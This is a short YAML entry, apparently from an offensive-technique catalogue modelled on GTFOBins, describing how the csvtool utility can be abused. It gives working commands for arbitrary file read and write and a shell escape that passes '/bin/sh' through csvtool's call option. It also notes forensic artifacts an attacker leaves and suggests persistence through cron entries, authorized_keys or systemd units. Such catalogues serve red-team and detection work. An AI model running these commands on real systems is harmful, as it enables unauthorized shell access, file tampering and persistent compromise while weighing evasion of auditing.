---
name: csvtool
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: csvtool trim t /path/to/input-file
  notes: The file is actually parsed and manipulated as CSV.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    echo DATA >/path/to/temp-file
    csvtool trim t /path/to/temp-file -o /path/to/output-file
  notes: The file is actually parsed and manipulated as CSV.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: csvtool call '/bin/sh;false' /etc/hosts
references:
- https://gtfobins.github.io/gtfobins/csvtool/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
